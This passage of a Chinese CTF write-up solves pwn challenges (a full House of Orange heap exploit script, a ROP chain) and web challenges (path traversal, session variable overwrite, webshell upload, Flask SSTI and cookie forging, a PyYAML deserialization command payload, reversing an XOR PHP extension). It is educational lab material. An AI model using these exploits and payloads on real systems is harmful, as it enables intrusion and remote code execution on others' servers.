    }
    printf("size:");
    v3 = read_int();
    if ( v3  0x1FFF )
    {
      LODWORD(v0) = puts("size overflow");
    }
    else
    {
      *((_QWORD *)&heap + 2 * i) = malloc(v3);
      dword_6020E8[4 * i] = v3;
      v0 = 16LL * i + 0x6020EC;
      dword_6020E8[4 * i + 1] = 1;
    }
    return v0;
    }
malloc申请内存的大小范围很大，申请的heap块地址存放在bss段0x6020E0
  * edit函数
        int edit()
    {
    signed __int64 v0; // rax
    int v1; // edx
    signed int v3; // [rsp+Ch] [rbp-4h]
    printf("index:");
    v3 = read_int();
    if ( v3 > 7 )
    {
      puts("out of index");
      exit(0);
    }
    if ( v3 != 5 || overflag != 1 )
    {
      if ( *((_QWORD *)&heap + 2 * v3) && dword_6020E8[4 * v3 + 1] == 1 )
      {
        printf("content:");
        read_con(*((_QWORD *)&heap + 2 * v3), (signed int)dword_6020E8[4 * v3]);
        v1 = strlen(*((const char **)&heap + 2 * v3));
        v0 = 16LL * v3 + 6299880;
        dword_6020E8[4 * v3] = v1;
      }
      else
      {
        LODWORD(v0) = printf("%s invaild index\n", &name);
      }
    }
    else
    {
      printf("content:");
      LODWORD(v0) = read_con(*((_QWORD *)&heap + 10), 1024LL);
      overflag = 0;
    }
    return v0;
    }
这里出题人故意留了很多漏洞供我们使用
  * `LODWORD(v0) = printf("%s invaild index\n", &name);`，name的位置在bss段，紧接着存放heap块地址的内存，填满name打印时可以泄露heap地址；
  * 修改content后使用`strlen`重新计算长度，而且输入没有进行00截断，可造成heap溢出；
  * edit 5号heap块时，可以写入1024字节，一个简单粗暴的heap溢出；
具体的利用思路：
  1. 开头输入0x20字节name，edit一个不存在的heap泄露heap地址；
  2. 利用edit第二个漏洞，修改topchunk size；
  3. 申请一个超大的heap，使topchunk被释放到unsorted bin，使用show进行泄露libc地址；
  4. 使用edit 5号heap进行堆溢出，覆盖unsortedbin的BK，构造fake FILE结构体；
  5. 随意申请一个heap触发unsortedbin attack完成整个攻击流程；
huose of Orange的具体原理不在详述了，可以查看其他大佬的文章。
EXP:
    def add(size):
        p.sendlineafter("choice:",'1')
        p.sendlineafter(":",str(size))
    def show(idx):
        p.sendlineafter("choice:","2")
        p.sendlineafter(":",str(idx))
    def edit(idx,content):
        p.sendlineafter("choice:","3")
        p.sendlineafter(":",str(idx))
        p.sendafter(":",content)
    p.sendlineafter("name","0"*0x20)
    add(0x18) #0
    p.sendlineafter("choice:","3")
    p.sendlineafter(":","6")
    # leak heap address
    p.recvuntil("0"*0x20)
    heap = u32(p.recv(4))
    success(hex(heap))
    # leak libc address
    add(0x18)  # 1
    edit(1,"1"*0x18)
    edit(1,"2"*0x18+p16(0xfc1)+'\x00') # top chunk
    add(0x1000)  # 2
    add(0x50)  # 3
    show(3)
    libc.address = u64(p.recv(6).ljust(8,"\x00")) - 0x3c4b20 - 0x668
    success(hex(libc.address))
    # house of orange
    add(0x10)  # 4
    add(0x10)  # 5
    payload = "3"*0x10
    payload += '/bin/sh\x00' + p64(0x61)
    payload += p64(libc.symbols["__malloc_hook"])
    payload += p64(libc.symbols['_IO_list_all']-0x10) 
    payload += p64(0) + p64(1) 
    payload = payload.ljust(0xd8+0x10,'\x00') + p64(heap+0xc0+0x10+0xd8+8) 
    payload += p64(0)+p64(0)+p64(1)+p64(libc.symbols['system']) 
    edit(5,payload+'\n')
    add(1) 
    p.interactive()
### overflow
    [*] '/home/kira/pwn/gxb/overflow'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
题目使用静态编译，存在一个很明显的栈溢出，直接使用ROPgadget生成ropchain即可。
    ROPgadget --binary overflow --ropchain
这题比较简单，属于pwn的签到题，不再详述了。
## web
### blog
打开是一个blog的登陆页面，扫描一下可以发现存在`/admin/`以及`/config/`目录，题目有列目录
config.ini文件有数据库信息，不过数据库不能外连，没用。
    [数据库连接信息]
    host = '127.0.0.1'
    user = 'root'
    pass = 'root'
    db   = 'seclover'
    [后台路径]
    path='/admin/'
    #需要修改后台路径时将admin文件夹重命名
点击`download.php`发现会下载自身，不过文件为空，burp重放发现响应包中有`filename=`参数。大胆猜测可以通过传入`filename=`参数进行文件下载。
简单fuzz一下常见的文件目录，最后发现`filename=/../etc/passwd`能读取到文件。
读取题目源码进行分析，发现`checklogin.php`存在变量覆盖漏洞
    select("`admin`","*","where `user`='$user'");
        if($userinfo['pass']===$pass){
            $_SESSION[admin] = 'true';
        }else{
            echo '密码错误！';
        }
而后台验证是使用session进行判断，因此通过变量覆盖将`$_SESSION[admin]`覆盖成True即可登陆后台。
    http://x.x.x.x/admin/checklogin.php?_SESSION[admin]=true
登陆后台后发现有上传功能，直接上传php会报错，使用burp抓包，通过大小写绕过后台黑名单限制，但是发现无法正常解析，最后使用`php5`成功解析，上传一句话木马直接getshell。
### easy_flask
打开页面也是一个登陆界面，发现随便输入一个账号密码即可登陆，但是提示不是admin。
ssti是常见的考点，直接在url中测试输入`/{{7*'7'}}`，发现404页面存在ssti。过滤比较严格，貌似无法直接读取文件或命令执行。不过发现`config`没有过滤。那么可以通过`{{config}}`读取`secret_key`，获取后可以伪造session越权为admin。
    'SECRET_KEY': 'c63701a0-f565-4a1f-a0b6-d0a80bf31b9a'
首先随意登陆一个账号，获取登陆cookie，解密cookie可以发现只有一个username字段
    yJ1c2VybmFtZSI6IjEyMyJ9.XdpOVA.1zVjAfpKt7wnpbvJyNGQ5a-ocSo 
    py -2 flask_session_cookie_manager2.py decode -s "c63701a0-f565-4a1f-a0b6-d0a80bf31b9a" -c "eyJ1c2VybmFtZSI6IjEyMyJ9.XdpOVA.1zVjAfpKt7wnpbvJyNGQ5a-ocSo"
    {u'username': u'123'}
将username修改为admin后，使用`secret_key`重新生成cookie
    py -2 flask_session_cookie_manager2.py encode -s "c63701a0-f565-4a1f-a0b6-d0a80bf31b9a" -t "{u'username': u'admin'}"
    eyJ1c2VybmFtZSI6ImFkbWluIn0.ELtihg.BnshJq3vrgRBfX7wTK-scsMxbOU
修改cookie，登录后发现增加了一个`tools`的功能，页面直接提示是`pyyaml`反序列化。
拿常见payload进行测试，发现有waf，目测是黑名单过滤，测试多个python命令执行的payload最后使用以下payload成功执行命令：
    !!python/object/new:commands.getoutput ["ls"]
    !!python/object/new:commands.getoutput ["cat f1111111111114g.txt"]
### php之禅
打开`index.php`会自动跳转，并加入get参数，通过观察，很容易发现一个文件包含漏洞，直接使用伪协议读取一波源码。
    http://100.100.100.122:8083/?f=home.php&n=Master
    http://100.100.100.122:8083/?f=php://filter/convert.base64-encode/resource=home.php&n=Master
但是base64解码之后，发现php是进行了加密的。
    >80qvlnyt0
使用扫描脚本扫描一下，寻找是否存在源码泄露或其他更多提示。最后发现了存在`phpinfo.php`。
    > py -2 SourceLeakHacker.py http://100.100.100.122:8083/ 10 5
     [ 302 ]  Checking : http://100.100.100.122:8083/index.php
     [ 200 ]  Checking : http://100.100.100.122:8083/phpinfo.php
通过phpinfo发现题目加载了奇怪的模块
    extension_dir /usr/lib/php/20151012
    mysqli
使用文件包含下载扩展模块的so文件
    http://100.100.100.122:8083/?f=php://filter/convert.base64-encode/resource=/usr/lib/php/20151012/mysqli.so&n=Master
拖入IDA进行分析，可以找到一个`php_decode_compile_file`的函数
    __int64 __fastcall php_decode_compile_file(__int64 a1, unsigned int a2)
    {
      signed int i; // [rsp+1Ch] [rbp-24h]
      __int64 v4; // [rsp+20h] [rbp-20h]
      size_t size; // [rsp+28h] [rbp-18h]
      void *s; // [rsp+30h] [rbp-10h]
      unsigned __int64 v7; // [rsp+38h] [rbp-8h]
      v7 = __readfsqword(0x28u);
      if ( !(unsigned int)zend_stream_fixup(a1, &v4, &size) && !strcmp(*(const char **)(a1 + 88), "/var/www/html/home.php") )
      {
        s = malloc(size);
        memset(s, 0, size);
        for ( i = 0; i = size - 5 )
            *((_BYTE *)s + i) = *(_BYTE *)(v4 + i);
          else
            *((_BYTE *)s + i) = *(_BYTE *)(v4 + i) ^ 0x18;
        }
        *(_QWORD *)(a1 + 40) = s;
      }
      return orig_compile_file(a1, a2);
    }
可以看到`home.php`进行了xor，算法不难直接将之前获取的源代码进行异或得到明文。
    Welcome,'.$_GET['n'].'!';
    echo 'try to get the flag!';
    $_t = $_GET['_t'];
    if($_t && (intval($_t) === round(microtime(true)))){
      echo $flag;
这里其实是出题人留的一个坑，如果强行爆破时间会得到一个假flag，重新查看so的代码，会发现`intval`被hook了。
    __int64 php_override_functions()
    {
      return php_override_func("intval", 8LL, (__int64)zif_intval_ex, &origin_funcs);
    }
`intval`被覆写成`zif_intval_ex`，具体伪代码如下：
    unsigned __int64 __fastcall zif_intval_ex(__int64 a1, __int64 a2)
    {
    if ( (unsigned int)zend_parse_parameters(*(unsigned int *)(a1 + 44), "s|z/", &v8, &v9) != -1 )